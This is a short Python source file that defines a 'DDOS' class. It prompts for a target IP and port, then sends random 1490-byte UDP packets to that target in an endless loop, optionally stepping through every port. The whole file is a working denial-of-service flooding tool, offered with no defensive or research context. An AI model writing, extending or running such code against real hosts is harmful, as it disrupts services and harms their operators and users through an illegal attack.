import socket, random
from app import Application

class DDOS(Application):
	def __init__(self):
		sent = 0
		ip = input(self.logtime(False) + ' ip = ')
		port = int(input(self.logtime(False) + ' port = '))
		fixed = str(input(self.logtime(False) + ' fixed port("y/n") = '))
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		bytes = random._urandom(1490)
		while True:
			sock.sendto(bytes, (ip,port))
			sent = sent + 1
			if fixed != 'y':
				port = port + 1
			print(self.logtime(), "Sent {} packet to {}:{}".format(sent, ip, port), end="\r")
			if port == 65534:
			  port = 1